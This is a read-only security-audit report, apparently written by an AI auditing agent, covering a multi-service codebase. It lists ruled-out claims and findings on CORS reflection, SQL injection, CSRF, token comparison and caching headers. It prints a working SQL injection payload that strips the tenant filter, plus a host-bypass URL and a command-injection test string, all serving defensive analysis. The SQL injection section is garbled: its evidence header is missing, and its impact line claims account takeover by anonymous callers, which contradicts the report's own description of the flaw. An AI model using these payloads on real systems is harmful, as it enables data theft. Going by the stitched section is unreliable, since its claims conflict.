specialists_or_stages: ehs-supply-chain (cross-cutting manifests + tree-wide secrets) - RETURNED, 8 (3 kept after lead dedup)
ehs-verifier (blind VER-09) - RETURNED, 89 assertions settled: 87 verified, 0 killed, 2 corrected
architecture.fell_back_and_why: No lane was skipped and no lane failed to return: all six components were audited by a specialist in its own context, plus a cross-cutting supply-chain lane and the blind VER-09 stage. Dispatched in waves of at most three in flight, with the report rewritten to disk after every lane returned so a cutoff would leave a real report rather than nothing. WHAT IS NOT VERIFIED: the three supply-chain findings (the promptbridge gateway keys, the cross-component X-Forwarded-For/admin coupling, and the tree-wide absence of lockfiles) were produced AFTER the blind assertion list was frozen and handed to the verifier, so they did NOT go through VER-09 and are the only findings here that no adversarial pass attacked. LEAD DEDUPLICATION: the supply-chain lane returned 8 findings; 5 named the same defect at the same path:line a component lane had already reported (the Airflow warehouse-URI log leak, the world-readable fleet token, the cleartext .deb fetch, the vault_analytics grant, the DB_PASS empty fallback) and were dropped rather than double-counted. LEAD OVERRULE: ai-safety and supply-chain disagreed about the promptbridge gateway keys - ai-safety dropped them as FP-02 (literal placeholders), supply-chain reported them as live credentials. The lead kept the supply-chain reading and removed the ai-safety dismissal from ruled_out, because FP-02's exculpation requires a real value to replace the placeholder at deploy time and the substitution mechanism was searched for and does not exist. TRIAGE INVARIANT ENFORCED BY THE LEAD: six findings were returned as `confirmed` while carrying an `UNKNOWN` triage answer, which triage.md invariant 1 forbids; each was lowered to `probable` with the correction recorded in its evidence and no code fact altered. VER-09 RESULT: the verifier opened 54 of the 55 target files, settled all 89 assertions it was given, killed NONE, and returned two corrections - one severity (the Salt os.system hook, medium -> low, no in-tree caller) and one status (the promptbridge prompt log, confirmed -> probable, the world-readable half depends on an undeclared umask). Both were applied. Read-only contract verified by SHA-256 diff of all 55 target files against a pre-audit baseline: unchanged.
architecture.notes: audit mode, read-only. No scanner was run (no network, no offline advisory database), so no finding rests on tool output and no dependency-advisory claim is made anywhere - with no lockfile in the tree three of four manifests do not resolve to a determinable version. No live host, endpoint, account or credential was touched.

ruled_out.assertion: SQL injection in RunbookIndex.search / by_slug via f-string interpolation
ruled_out.killed_by: Both interpolated values are safe: self.schema comes from config (retrieval.py:17) and k is int-coerced twice (retrieval.py:27 and :35). The attacker-controlled values, collection and query, travel as bound parameters at retrieval.py:39 and :55.

ruled_out.assertion: guardrails.allowed_host is bypassable by userinfo, case or scheme trickery
ruled_out.killed_by: urlparse().hostname returns the true host for a https://allowed@evil.example/ style URL and the comparison case-folds both sides. The function is correct; the defect is that the enabled tool never calls it, reported separately as the SSRF finding.

ruled_out.assertion: Cross-client prompt leakage through the shared ModelCache
ruled_out.killed_by: The cache is keyed by URI and predict() builds a fresh single-row frame per call with no retained state, so one client's prompt cannot surface in another's completion. The genuine cross-client exposure is the shared audit log, reported separately.

ruled_out.assertion: Secrets or business rules are embedded in the system prompt template
ruled_out.killed_by: SYSTEM_TEMPLATE carries only role framing, the tool manifest and three generic house rules. Checked line by line: no credentials, thresholds, table names or customer lists.

ruled_out.assertion: Tool-description poisoning in the MANIFEST string
ruled_out.killed_by: The manifest is three first-party lines in the repository, each a short factual description with no imperative text aimed at the model and no disproportionate length. It is reviewed as code. Its real problem, publishing the tool grammar to injected content, is carried as evidence in the retrieval-injection finding.

ruled_out.assertion: The target tree contains text addressed to the auditing agent (AI-22 indirect prompt injection of the auditor)
ruled_out.killed_by: No CLAUDE.md, AGENTS.md, .mcp.json, .cursor/rules, copilot-instructions or SKILL.md exists anywhere in the target; the Unicode sweep for Tags, zero-width and bidi ranges returned zero hits across all files. The one comment that argues against review, tools.py:57-61, is reported as a finding rather than obeyed.

ruled_out.assertion: Binding 0.0.0.0 exposes the gateway on all interfaces
ruled_out.killed_by: Binding all interfaces is the intended and bounded shape for a containerised service. It is load-bearing only as the reason the unauthenticated /healthz route is reachable, so it is carried as context inside that finding rather than asserted alone.

ruled_out.assertion: Per-object tool authorization is absent from the tool layer
ruled_out.killed_by: No second principal exists at the tool-authorisation layer: lookup_runbook reads a shared corpus with no subject column and no tool takes an owner argument. The authorization defects that do exist are the capability design and the missing post-ingestion degradation, both reported.

ruled_out.assertion: Command injection in AdminController::logs through the journalctl shell_exec
ruled_out.killed_by: Neither interpolated value is attacker-controlled: $unit comes from $settings['logs']['unit'], which is getenv('LOG_UNIT') with a literal fallback and no request path to it, and $lines is clamped to 10..2000 at AdminController.php:83 and cast to int again inside the concatenation. The route's real defect is that it is unauthenticated, reported separately.

ruled_out.assertion: SQL injection through the ORDER BY and LIMIT interpolation in TicketController::index
ruled_out.killed_by: All three interpolated values are constrained before they arrive: Sanitize::sortColumn uses in_array with strict comparison against settings.php:34 and falls back to $allowed[0], Sanitize::direction collapses everything to the literals ASC or DESC, and $limit is min(200, max(1, (int) ...)) at TicketController.php:31.

ruled_out.assertion: Identifier injection through caller-chosen array keys in Db::update
ruled_out.killed_by: Each key is wrapped in backticks after every backtick is stripped with str_replace, and inside a MySQL backtick-quoted identifier the backtick is the only metacharacter, so no key can terminate the quoting or introduce syntax. An unknown column produces a prepare error, not injection; values travel as bound parameters. The real defect on this path is which columns the caller may name, reported as mass assignment.

ruled_out.assertion: Sanitize::filename can be bypassed to reintroduce a path separator
ruled_out.killed_by: basename removes POSIX directory parts, the preg_replace maps everything outside [A-Za-z0-9._-] to underscore including backslash, ltrim strips leading dots so '..' becomes empty, and the 120-character truncation is applied last so it cannot reintroduce a separator. The null-return case falls through to the 'file.bin' default, failing closed. The bypass is not in the function; it is that download() never calls it.

ruled_out.assertion: Unrestricted file upload allows stored web-shell execution
ruled_out.killed_by: Uploads land in dirname(__DIR__) . '/var/attachments', outside the document root (composer.json:22 serves -t public), and the only reader serves them with Content-Type: application/octet-stream and Content-Disposition: attachment (AttachmentController.php:62-64), so a stored .php or .html file is neither executed by the server nor rendered by the browser.

ruled_out.assertion: Stack traces with framework internals are returned in error responses
ruled_out.killed_by: index.php:39 passes $settings['display_errors'] as the displayErrorDetails argument, and settings.php:43 resolves it through filter_var(getenv('APP_DEBUG') ?: 'false', FILTER_VALIDATE_BOOLEAN) - false unless an operator sets APP_DEBUG. The default is closed and the switch is environment-gated.

ruled_out.assertion: TOCTOU between the ownership check and the UPDATE in TicketController::update
ruled_out.killed_by: The window can only be exploited by a concurrent change of the ticket's tenant_id, which requires a second actor who already has the access the check protects, so no second principal gains anything. It is recorded in the mass-assignment recommendation, where the fix belongs.

ruled_out.assertion: Aggregate upload size across one multipart request is unbounded
ruled_out.killed_by: The declared limit storage.max_bytes has a real reader at AttachmentController.php:37 that rejects an oversized file with 413. The missing aggregate bound is enforced outside this code by PHP's own max_file_uploads and post_max_size, and asserting a defect there would be asserting something about a php.ini not in scope.

ruled_out.assertion: Header injection through the Content-Disposition filename in the attachment download
ruled_out.killed_by: Line 55's is_file gate means the value must name a file that actually exists on disk, and every file this service creates has been through Sanitize::filename, which admits only [A-Za-z0-9._-]. CR/LF injection is separately blocked by PSR-7 header validation.

ruled_out.assertion: No rate limiting on token verification permits credential guessing
ruled_out.killed_by: The token is 48 hex characters from random_bytes (AdminController.php:66) and the lookup keys on an 8-character prefix, so guessing is infeasible regardless of request rate. The genuinely unprotected expensive endpoints are unprotected because they require no credential at all, which is the missing-authentication finding.

ruled_out.assertion: XXE through Slim's XML body parser registered at index.php:19
ruled_out.killed_by: NOT ruled out on evidence - recorded here as explicitly undecided. vendor/ is not in scope so the parser could not be read; PHP >= 8.1 with libxml >= 2.9 disables external entity loading by default, but the specialist declined to assert a platform default as either a finding or a clearance.

ruled_out.assertion: sandbox_token is a hardcoded credential in the pillar
ruled_out.killed_by: The only consumer is sandbox_check, which sends it to a vendor sandbox host that holds no production data, and the literal is a self-describing published quickstart value ('sandbox-0000-public-quickstart'). Reporting it as a credential would be a decoy of exactly the shape the triage rules exist to prevent.

ruled_out.assertion: /assets/ sets Access-Control-Allow-Origin *
ruled_out.killed_by: The wildcard is scoped to one location serving static files from local disk with no proxy_pass, no cookies, no Access-Control-Allow-Credentials and no session. A wildcard ACAO on credential-less public assets grants a browser nothing it could not fetch directly.

ruled_out.assertion: /api/ pairs Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true
ruled_out.killed_by: widget_origin is a single fixed pillar value (https://console.internal.example), not a wildcard and not reflected from the request Origin. A fixed origin with credentials is the correct credentialed-CORS pattern, and a missing Vary: Origin only matters when the header varies.

ruled_out.assertion: proxy_set_header Host $host is forwarded unsafely to the backend
ruled_out.killed_by: Host $host is nginx's own documented recommendation for a reverse proxy, and no evidence in this component shows the backend deriving a security decision or an absolute URL from it.

ruled_out.assertion: deploy_key in the pillar is committed private key material
ruled_out.killed_by: The blob is an ssh-ed25519 PUBLIC key consumed by ssh_auth.present to populate authorized_keys - it is meant to be published. The real defect on those lines is the absence of restricting options, reported as its own finding.

ruled_out.assertion: /assets/ is vulnerable to the nginx alias path-traversal off-by-one
ruled_out.killed_by: The directive is `root`, not `alias`, and the location carries a trailing slash, so nginx appends the full normalized URI to /srv/www and the alias traversal class does not apply. nginx also normalizes dot-segments before location matching.

ruled_out.assertion: Server-level headers are silently dropped by locations that declare their own add_header
ruled_out.killed_by: The footgun is real in nginx but has no victim here: the server block declares no add_header at all, so no header is dropped. Carried forward as a caveat inside the HSTS recommendation, where it would bite whoever adds it.

ruled_out.assertion: No environment separation - one saltenv for the whole fleet
ruled_out.killed_by: The precondition for the finding is absent rather than the control: the component declares one saltenv, one upstream and one control plane. There is no second environment being conflated with production, so asserting a separation defect would be inventing the second environment.

ruled_out.assertion: Log injection through node_id and name interpolated into log.info
ruled_out.killed_by: Both log_escaper flags are the same tainted values that reach a shell in the drain and _post_enroll_hook findings. Log-record forgery is strictly dominated by root command execution on the identical input; reporting it separately would double-count one taint path as two findings.

ruled_out.assertion: The embedded map-tiles key pk.map-tiles-public-demo-0000 is a hardcoded secret
ruled_out.killed_by: The value is a publishable tile token (pk. prefix, literal 'public-demo'), documented as scoped to tile endpoints and shipped in the vendor's own web demo, and it is sent to a third-party host that never receives the session. The correct action is to document the provider-side restriction, not to report a secret.

ruled_out.assertion: SQL injection through string interpolation into rawQuery in the delivery cache
ruled_out.killed_by: The interpolated value is int-typed (final int deliveryId, delivery_detail.dart:19) and the only construction site parses it with int.tryParse and returns on null. Verified with Dart that int.tryParse('5 OR 1=1') is null; the worst reachable value is a negative integer.

ruled_out.assertion: JWT claims are parsed without signature or expiry verification
ruled_out.killed_by: claims() decodes the payload for display and no authorization decision in the component reads it - isSignedIn tests string emptiness only. A client decoding its own token for rendering is not a defect.

ruled_out.assertion: checkPin is a client-side authentication gate with no lockout
ruled_out.killed_by: No gate exists to bypass: checkPin has no caller in the component and no screen in it collects a PIN, so there is no protected transition and no second principal. What is real about the PIN - that its encryption is decorative - is reported on the crypto envelope itself.

ruled_out.assertion: Overlay/tapjacking exposure on the delivery-confirmation screen
ruled_out.killed_by: The screen authorizes nothing irreversible - a completion record the server can undo - and this is a Flutter app with no XML layouts, where an absent layout attribute is not evidence and the guard belongs at the host window, outside this component.

ruled_out.assertion: Unchecked casts on the server payload are a security defect
ruled_out.killed_by: payload['access_token'] as String and jsonDecode(...) as Map throw on unexpected server data. The effect is an uncaught exception - an availability and robustness defect with no security boundary crossed.

ruled_out.assertion: The stored PIN is compared in non-constant time
ruled_out.killed_by: The comparison is local, and the only principal who can time it already holds the device and the ciphertext, at which point the constant-key defect gives the PIN directly and far faster.

ruled_out.assertion: uploadFingerprint uses an unkeyed hash where authenticity is required
ruled_out.killed_by: The doc comment states it is a dedupe fingerprint, not an authenticity control, and an unkeyed digest is the right primitive for deduplication. It has no caller in the component and governs no decision here.

ruled_out.assertion: The cold-start deep link is never handled, a security gap
ruled_out.killed_by: uriLinkStream alone misses the launch link, which loses functionality. It narrows the attack surface rather than widening it - not a security defect.

ruled_out.assertion: depot.courier.example is trusted in Dart but has no intent-filter, an exploitable asymmetry
ruled_out.killed_by: The host is in _trustedHosts but has no intent-filter, so it simply never launches the app. The asymmetry fails safe; it is recorded only because it shows the allowlist and the manifest are maintained separately.

ruled_out.assertion: JavaScript is enabled unrestricted in the help-centre WebView
ruled_out.killed_by: Navigation in that view is confined to a first-party host by the predicate at proof_webview.dart:86-89, so unrestricted JavaScript executes only on content the vendor controls. For the proof view, JavaScript is a precondition of the token and bridge findings rather than independently actionable.

ruled_out.assertion: SQL injection via String.format in MetadataRepository.listByOwner
ruled_out.killed_by: Neither spliced value is attacker-controlled. The %s is sort.column(), and SortColumn.column() can only return one of three compile-time literals; SortColumn.parse returns CREATED_AT for any unmatched input including null. The %d is an int supplied as the literals 100 and 200 at MainVerticle.java:92/98/142.

ruled_out.assertion: Path traversal in BlobStore.readPreset via the caller-supplied preset name
ruled_out.killed_by: The name never becomes a path component: it is a key into a three-entry immutable Map, and an unknown key returns a failed Future before any filesystem call. The path is built from the constant value, not the input. The failure message echoes the name but MainVerticle.java:127 discards it and returns a fixed 404.

ruled_out.assertion: The unauthenticated /v1/health/config endpoint discloses service configuration
ruled_out.killed_by: It returns only config.getJsonObject("public") - never the whole config - and that sub-object holds a build number, a cloud region and a documentation URL. The db, auth and blobs blocks are not reachable through it; the exposure is intended and explicitly delimited by a key named public.

ruled_out.assertion: SQL injection in RetentionSweeper via string-concatenated query
ruled_out.killed_by: Both interpolated values are out of an attacker's reach: keepDays is an int from getInteger and bucket is a config string read from config.json:19, never from a request. No route in the component writes configuration.

ruled_out.assertion: Blob responses are sniffable into HTML because no X-Content-Type-Options header is set
ruled_out.killed_by: The response type is application/octet-stream, which modern browsers do not sniff into HTML, and there is no wired upload path in this tree that would let an attacker control blob bytes in the first place - BlobStore.write has zero callers.

ruled_out.assertion: Integer.parseInt on the limit parameter enables a 500-based disclosure or exhaustion
ruled_out.killed_by: The throw yields a 500 with no stack trace (Vert.x's default failure response carries no exception detail), and the parsed value is clamped to 1..500 immediately, so neither disclosure nor resource exhaustion follows.

ruled_out.assertion: SortColumn.parse silently falling back to CREATED_AT is a security defect
ruled_out.killed_by: The fallback is the safe value and no security decision depends on it; this is a UX choice, not a defect.

ruled_out.assertion: config.json declares http.host 0.0.0.0 which is never read, widening the bind
ruled_out.killed_by: MainVerticle calls the listen(int) overload so the key is never read, but Vert.x's default bind address is also 0.0.0.0, so the runtime behaviour is identical to the declared intent and nothing is widened by the omission.

ruled_out.assertion: A permissive CORS configuration exposes the vault API cross-origin
ruled_out.killed_by: No CorsHandler is registered anywhere and the string 'cors' does not appear in the component. Absence of a CORS handler is the safe default - the browser same-origin policy applies unmodified. Recorded so the check is visible rather than assumed.

ruled_out.assertion: The JWKS file holds a symmetric HMAC key, so every verifier also holds the minting key
ruled_out.killed_by: NOT ruled out on the merits - withheld because no single CWE crisply names the construct, and the report contract requires exactly one. The verification path it feeds is otherwise sound: signature, issuer, audience and expiry all enforced, with the key pinned to MAC algorithms. Carried as an open design question about key distribution and rotation rather than a finding.

ruled_out.assertion: flyway-core is declared but never invoked, so migrations may not be applied
ruled_out.killed_by: Its only security-relevant consequence would be that the schema and grants in V1__init.sql are not the ones in force - which would weaken the cascade and grant findings rather than create an exposure of its own. Recorded as an open question inside those findings.

ruled_out.assertion: Command injection through shlex.quote plus shell=True in archive_report
ruled_out.killed_by: shell=True reads dangerous, but every token is quoted individually before the join, so the rendered command is equivalent to passing the argument list without a shell. Verified by executing the exact expression: ['tar','czf','a; id .tgz','-C','/w','reports'] renders as tar czf 'a; id .tgz' -C /w reports, with the metacharacters inside a single-quoted token.

ruled_out.assertion: PARTITION_RE's $ anchor accepts a trailing newline, enabling injection
ruled_out.killed_by: The regex defect is real (PARTITION_RE.match('eu-west/2026-03-01\n') matches, because Python's $ matches before a trailing newline; \Z is the fix), but neither sink it reaches is dangerous in the form it is reached: the partition goes to a parameterised query where it is bound, and to a URL whose host is a hardcoded literal and which requests rejects for containing a control character. Worth a one-character hardening change; not a finding.

ruled_out.assertion: LedgerExportOperator re-reads raw conf instead of the gate's validated XCom
ruled_out.killed_by: export_reconciled sits downstream of the gate with the default all_success trigger rule, so a payload that fails validation fails the run before the operator executes. The validator was checked for a gap the path sink could use: prefix.replace('-','').replace('_','').isalnum() is Unicode-aware, but /, . and NUL are not alphanumeric in any script, so neither traversal nor an absolute path survives it.

ruled_out.assertion: CSV/formula injection into the finance-share export via the memo field
ruled_out.killed_by: The untrusted memo field never reaches the file finance opens. stage_csv has two callers carrying different data: the vendor path writes memos to a staging file consumed by a database COPY, while the export path that lands on /mnt/finance-share is fed the rows from compare_totals, which are (currency, SUM(amount_minor)) only. currency is upper-cased and truncated to three characters at transforms.py:72, too short for a formula.

ruled_out.assertion: Neither DAG declares access_control, widening who can trigger them
ruled_out.killed_by: Absent DAG-level access_control widens who can supply a trigger payload, which is the reachability argument for the injection findings rather than a separate defect. It is carried in the FP-06 answers and impact statements of the findings it enables.

ruled_out.assertion: The task_policy cluster policy is a dead guard that enforces nothing
ruled_out.killed_by: The policy does exactly what its docstring claims (an execution timeout) and it is not dead: task.dag_id.startswith('ledger_') matches both shipped DAGs. Faulting it for not additionally validating params would be reporting the absence of a control nobody claimed to have implemented; its silence is recorded as a searched-and-found-nothing entry on the injection findings instead.

ruled_out.assertion: Manual CSV parsing in _load_delivery breaks on quoted commas, a security defect
ruled_out.killed_by: line.rstrip('\n').split(',') mis-parses quoted fields and dict(zip(...)) silently truncates a short row. This corrupts data but grants no attacker capability the other findings do not already grant, and the corrupted values reach only parameterised or type-coerced sinks - int(Decimal(...)) raises on a non-numeric amount. A correctness defect, not a vulnerability.

ruled_out.assertion: fetch_reference's allowlist checks the pre-redirect host only
ruled_out.killed_by: The one host check in the tree inspects the initial URL and follows redirects with requests' defaults, so it is not a robust control; folded into the SSRF finding's recommendation, since fixing that route in isolation would leave the same weakness.

ruled_out.assertion: demo:demo is an exploitable hardcoded credential in the Airflow settings module
ruled_out.killed_by: The literal is only ever split and sent to settings.SANDBOX_BASE_URL, a constant vendor sandbox URL, never to a value derived from input; the comment documents it as published in the vendor's getting-started guide against a nightly-wiped tenant. Unlike the promptbridge keys, this credential's destination is fixed and its scope is a public sandbox, so FP-02 genuinely holds here. NOTE: the airflow lane reported the same construct at low/probable as a pattern finding; both readings are retained, the supply-chain lane's as the exculpation of exploitability.

ruled_out.assertion: sandbox-0000-public-quickstart in the salt pillar is an exploitable hardcoded credential
ruled_out.killed_by: fleetctl.sandbox_check sends it only to the hardcoded https://sandbox.fleetvendor.example/api/v1/ping literal, never to a pillar-supplied or input-derived host. Documented public quickstart value.

ruled_out.assertion: The ssh-ed25519 deploy key committed in the pillar is exposed private key material
ruled_out.killed_by: The committed value carries the AAAAC3NzaC1lZDI1NTE5 prefix, which is the public half of an ed25519 keypair, and it is consumed by ssh_auth.present with enc: ssh-ed25519 - an authorized_keys entry, public by construction. Who holds the matching private key is a CI access question outside this tree.

ruled_out.assertion: A known-vulnerable dependency version is reachable in one of the four manifests
ruled_out.killed_by: Refused under the supply-chain triage rule that presence of a version is not exploitability. With no lockfile anywhere in the tree, three of four manifests do not resolve to a determinable version, so there is nothing to match an advisory against, and no scanner was run (no network, no offline database). Naming an advisory against a floating range would be an assertion that cannot be supported.

ruled_out.assertion: Psr\Http\* classes are used but declared only transitively in composer.json
ruled_out.killed_by: Build fragility rather than a security property: the classes resolve today because slim/slim brings psr/http-server-middleware and slim/psr7 brings psr/http-message. No attacker consequence follows.

ruled_out.assertion: ext-pdo and ext-pdo_mysql are used but undeclared in composer.json
ruled_out.killed_by: Accurate - composer.json:7 declares only php >=8.1 while Db.php:24 constructs a PDO against a mysql: DSN - but a missing platform requirement produces a runtime error on a misprovisioned host, not a security outcome.

ruled_out.assertion: pom.xml has no build section, leaving plugin versions unpinned
ruled_out.killed_by: Verified: no <build>, so no plugin versions are pinned and no shade/assembly plugin exists. This is a build reproducibility and packaging defect, not a security one - Maven's super-POM supplies default lifecycle plugin versions, so it is not floating resolution in the npm sense.

ruled_out.assertion: The unused `path` package in pubspec.yaml widens the executable surface
ruled_out.killed_by: package:path is a Dart-team first-party package with no install hooks, and Dart packages do not execute code at resolution time, so an unused declaration adds no executable surface.

ruled_out.assertion: promptbridge sql_console is reachable and executes concatenated SQL
ruled_out.killed_by: ToolBox.registry() builds its dispatch table from a fixed four-entry dict that does not contain sql_console, then filters it by self.enabled - so no value of tools.enabled in config.yaml can expose it, and self.sql_console_enabled is read but never consulted. dispatch() can only reach handlers present in that dict. NOTE: the ai-safety lane reports the latent form of this at low severity; this entry records only that the REACHABLE form was attacked and refuted.

findings.title: CORS middleware reflects the request Origin and pairs it with Access-Control-Allow-Credentials: true
findings.evidence: config/settings.php:24 sets 'allow_origin' => '*' as a literal with no env override, and :25 sets 'allow_credentials' => true. public/index.php:30 turns the wildcard into reflection: $allow = ($configured === '*' && $origin !== '') ? $origin : $configured; - the wildcard branch is never emitted when the caller sends an Origin, so line 33 writes the attacker's own origin into Access-Control-Allow-Origin and line 34 writes Access-Control-Allow-Credentials: true beside it. That is the exact pair the browser rule against '*' + credentials exists to prevent, defeated by echoing a specific origin. The middleware is registered with $app->add(...) at line 25 - on the application, not a route or group - so it decorates every response. The preflight handler at line 45 sits outside both groups and answers OPTIONS for any path without authentication. Independent of any cookie: the /admin group (line 58) carries no authentication, so any page can read /admin/sessions, /admin/tenants and /admin/logs cross-origin with credentials omitted entirely.
findings.impact: Any web page a victim visits can read this API's responses cross-origin. With no credential at all it reads the operator console: tenant names, billing emails, live session rows with user emails and token prefixes, and the service journal. Where the victim's browser attaches the desk_session cookie (AuthMiddleware.php:37 accepts it as a credential), the same page reads and writes that user's tickets - GET, POST and PATCH are all in allow_methods (settings.php:27).
findings.recommendation: Replace the wildcard with an exact-match allowlist of partner origins compared in full, and emit Access-Control-Allow-Origin only when the request Origin is in it. Never emit Access-Control-Allow-Credentials: true together with a reflected or wildcard origin. If the widget cannot enumerate its hosts, drop credentials and authorize it with an explicit Authorization header instead of an ambient cookie.

triage.reason: This is the decoy shape FP-11 was written for, and it is not what is here. The middleware is registered on the application object at public/index.php:25, not on a route or group, so it takes effect on every response: the authenticated /tickets group (47-55), the unauthenticated /admin group (58-63), /healthz (65) and the catch-all OPTIONS route (45). There is no route-scoped variant and no narrowing condition.

findings.title: SQL injection: Sanitize::statusClause interpolates a client CSV into a quoted IN list

The finished string reaches Db::all -> $pdo->prepare (Db.php:37) with only the tenant bound as a parameter, so the injected text is parsed as SQL. ?status=open') OR ('1'='1 yields ... WHERE tenant_id = ? AND status IN ('open') OR ('1'='1') ORDER BY created_at DESC LIMIT 50 - the tenant predicate is disjoined away. What makes this hard to see: the same class provides three genuine allowlists used on the same three lines (sortColumn at :28 with in_array strict, direction at :33 closed to ASC/DESC, both called at TicketController.php:29-30), so the call site reads as sanitized.

Stacked statements are unavailable because PDO::ATTR_EMULATE_PREPARES is false (Db.php:27), so this is a read primitive.

Change the helper's signature to return the fragment and its parameters together so a caller cannot use it without binding.

No layer intercepts it. Db::all (Db.php:35-41) prepares whatever string it is handed; the WRITABLE allowlist at Db.php:17 guards only the update path and this is a SELECT. EMULATE_PREPARES=false blocks stacked queries but does nothing about injection inside a single statement.
The sink is a live SQL statement executed at Db.php:38 ($st->execute), not a text format or a parser.
statusClause has exactly one caller (TicketController.php:35, confirmed by grep), and that caller is a mounted route (GET /tickets, index.php:48) reachable by any authenticated user.

findings.impact: Full account takeover of any user by any caller who reaches the route - anonymously today, and by any authenticated customer even after the routing bug is fixed. findings.title: State-changing routes are authorized by an ambient cookie with no anti-CSRF control
findings.evidence: Line 37 falls back to $request->getCookieParams()['desk_session'] whenever the Authorization header is absent or does not begin with 'Bearer ', and the cookie value is then treated as a full credential by the same digest check on line 58. The class docblock (22-24) states the reason: the embedded widget cannot set headers. grep for csrf|samesite over the whole tree returns nothing - no token, no origin check, no custom-header requirement, no SameSite handling. Four state-changing routes accept that credential: POST /tickets, PATCH /tickets/{id}, POST /tickets/{id}/attachments and DELETE /tickets/{id}/attachments/{name} (index.php:49, 51, 52, 54). Slim's addBodyParsingMiddleware (index.php:19) parses form-urlencoded bodies, so a plain cross-site HTML form reaches POST /tickets with no preflight.
findings.impact: A page the victim visits performs writes as the victim: opening tickets, and via PATCH - which is in Access-Control-Allow-Methods (settings.php:27) and is preflight-approved by the reflected CORS policy - mass-assigning ticket fields, including moving a ticket out of its tenant.
findings.recommendation: Drop the cookie fallback and authorize only from the Authorization header; give the widget a token it holds itself. If an ambient cookie must stay, require a custom header on every unsafe method (forcing a preflight the CORS policy can then refuse), set the cookie SameSite=Strict where it is issued, and verify a session-bound anti-CSRF token server-side.

triage.reason: There is no anti-CSRF layer in the tree: grep for csrf across all ten files returns nothing, and the only middleware registered are the CORS closure (index.php:25), routing (:20), errors (:39) and AuthMiddleware (:55).

The construct is what it looks like - line 37 is a credential source on equal footing with the Bearer header, feeding the same lookup at :44 and the same digest check at :58, with no distinction drawn downstream.

The decisive control is the Set-Cookie attributes on desk_session, and the code that issues it is not in this tree - the docblock at AuthMiddleware.php:23-24 places it in a sign-in redirect I was not given, and grep for setcookie/SameSite returns nothing. A browser default of SameSite=Lax would block the cross-site POST while leaving the header-forced variants in play. No artifact settling this arrived, so this caps the finding at probable.

scope.narrowed_by: Access-Control-Allow-Methods (settings.php:27) omits DELETE, so the cross-origin form of the attack cannot reach the DELETE route; POST is reachable with a simple form and needs no preflight, and PATCH is reachable because the CORS reflection approves its preflight for any origin.

findings.title: The session token digest is compared with a loose, non-constant-time operator
findings.evidence: Line 58 is if ($session['token_digest'] != $digest) - the sole authentication decision in the tree, made with != rather than !== or hash_equals. grep for 'hash_equals' over the tree returns nothing. PHP 8's loose comparison of two numeric strings is numeric, so a 64-character digit-only string is converted to a float and two distinct digests can compare equal; the comparison also short-circuits on the first differing byte. I am reporting the defect and not overstating it: neither path is practically exploitable here, because the attacker chooses the token and not the digest, so byte-wise timing yields no incremental progress toward a preimage, and the chance a SHA-256 digest is all-digits is about (10/16)^64.
findings.impact: No exploitable path in the current design. The defect is that the codebase's one authentication decision does not use a constant-time equality for a secret, so it depends on properties of the surrounding design rather than on the comparison itself - and any future change to the token or digest format turns it into a live bypass with no other line needing to change.
findings.recommendation: Replace line 58 with if (!hash_equals((string) $session['token_digest'], $digest)).

triage.reason: FP-10 would apply if a server-side equivalent control existed and this were defence in depth. It does not: line 58 is the only verification of the token secret in the tree - line 39 checks length and lines 48-49 check revocation and expiry, neither of which authenticates. The impact is bounded by the token format, not by another control, which is why the severity is low rather than the finding being ruled out.
Both operands trace to the caller's input: $digest is sha256 of the presented token (line 43) and the row is selected by a prefix of that same token (line 50).
The comparison is the authentication decision itself - its false branch returns 401 at line 59 and its true branch grants the request at lines 62-67.

scope.established_by: The single comparison of a secret in the tree; grep for hash_equals returns no hits anywhere.
scope.narrowed_by: Exploitability is bounded by the token format - a 48-hex-character secret (AdminController.php:66) hashed to a 64-character digest - which makes both the numeric-string and the timing path impractical at present. That bound is a property of the format, not of this line.

searched.for: the token format, to judge whether the numeric-string path is reachable
searched.found: line 66 mints bin2hex(random_bytes(24)) - 48 hex characters from a CSPRNG, and line 71 stores sha256 of it, so both operands are always 64-character hex

searched.for: a second verification of the secret that would make this line non-load-bearing
searched.found: nothing - line 39 checks only length, lines 48-49 check revoked_at and expires_at, and line 50 binds only the 8-character prefix

findings.title: Responses vary by the Origin header and carry tenant data, with neither Vary nor Cache-Control set
findings.evidence: Line 33 writes an Access-Control-Allow-Origin value that depends on the request's Origin header (computed at line 30 from line 29), making the response content-negotiated on a request header. No Vary header is written anywhere: grep for withHeader over the tree returns eleven call sites - the four CORS headers (33-36), Content-Type on each JSON response, and Content-Length plus Content-Disposition in AttachmentController - and no Vary and no Cache-Control among them. The affected responses include tenant ticket listings (TicketController.php:39) and, via the unauthenticated /admin routes, live session rows with user emails (AdminController.php:42).
findings.impact: Where a shared cache or CDN sits in front of this API, two consequences follow from the same omission: a response stored with one visitor's origin in Access-Control-Allow-Origin is served to a different origin, extending the CORS reflection to origins that never made a request; and an authenticated JSON response with no Cache-Control is eligible for heuristic caching and can be served to another user.
findings.recommendation: Add Vary: Origin alongside the Access-Control-Allow-Origin header at index.php:33, and set Cache-Control: no-store on every response that carries tenant or session data - at minimum in the two json() helpers (TicketController.php:127, AdminController.php:91) and on the attachment download at AttachmentController.php:61.

triage.reason: No layer in the tree adds either header: the eleven withHeader call sites are exhaustive (grep), and no framework default supplies Vary - Slim writes only what the application writes.
The cacheable responses carry customer data: ticket subjects and statuses per tenant (TicketController.php:33-40) and user emails with session metadata (AdminController.php:42).

Whether a shared cache or CDN is actually deployed in front of this service cannot be established from the ten files in scope - there is no deployment manifest, no proxy configuration and no infrastructure code here. The missing headers are a confirmed property of the code; the exploitation requires that cache, so this caps the finding at probable.

scope.established_by: Enumerating every withHeader call in the tree with grep and checking the set against what a per-origin, per-user response requires; the Vary obligation attaches at index.php:33 where the header value becomes request-dependent, and the Cache-Control obligation at each response builder that emits tenant data.
scope.narrowed_by: Only responses that pass through the app-level CORS middleware vary by Origin - which is all of them. The cache-poisoning half applies only where a shared cache exists; the missing Cache-Control applies to browser and proxy caches alike.

searched.for: a Vary header, a Cache-Control default, or a middleware setting either
searched.found: nothing - lines 33-36 write four Access-Control headers and no others; the response is returned unmodified otherwise

searched.for: per-response cache directives on endpoints returning tenant data
searched.found: nothing - each json() helper writes only Content-Type (TicketController.php:131, AdminController.php:95, AttachmentController.php:85, LegacySearchController.php:33)

